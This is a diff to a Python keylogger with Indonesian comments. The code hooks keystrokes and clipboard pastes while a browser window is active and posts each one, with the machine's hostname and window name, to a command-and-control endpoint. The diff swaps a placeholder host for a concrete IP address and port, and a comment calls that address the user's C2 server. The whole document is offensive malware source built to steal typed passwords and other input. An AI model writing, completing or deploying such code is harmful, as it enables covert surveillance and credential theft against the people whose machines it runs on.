@@ -4,6 +4,7 @@ import keyboard
 import requests
 
 
+
 def act_win_pn():
     # Simulasi mendapatkan jendela aktif
     return (1234, "chrome.exe", "Google Chrome")
@@ -20,8 +21,9 @@ def GetTextFromClipboard():
 
 
 def save_log(log, text, caption):
-    global key_log
-    r = {
+    key_log = ""  # Reset log setelah mengirim
+
+    payload = {
         'gid': "sType",
         'pid': "gType",
         'pcname': socket.gethostname(),
@@ -29,15 +31,22 @@ def save_log(log, text, caption):
         'windowname': caption,
         'data': log,
     }
-    host2 = "http://{HOST}:{PORT}"  # Ganti dengan C2 server Anda
-    requests.post(host2 + "/api/clip", data=r)
-    key_log = ""  # Reset log setelah mengirim
+
+    host2 = "http://192.168.0.85:1224"  # Ganti dengan C2 server Anda
+    headers = {
+        'Content-Type': 'application/json',
+    }
+
+    try:
+        response = requests.post(host2 + "/api/clip", json=payload, headers=headers)
+        print("Response:", response.status_code, response.text)
+    except requests.exceptions.RequestException as e:
+        print("Error:", e)
 
 
 def OnKeyboardEvent(event):
     (pid, text, caption) = act_win_pn()
     if browserList(text):
-        global key_log
         key = event.name
 
         if keyboard.is_pressed('ctrl'):
@@ -52,14 +61,7 @@ def OnKeyboardEvent(event):
         if keyboard.is_pressed('ctrl') and event.name.lower() == 'v':
             key += GetTextFromClipboard()
 
-        key_log += key
-
-        if key == "\n" and len(key_log):
-            save_log(key_log, text, "extension")
-
-        else:
-            if len(key_log):
-                save_log(key_log, text, "extension")
+        save_log(key, text, "extension")
 
     return True
 
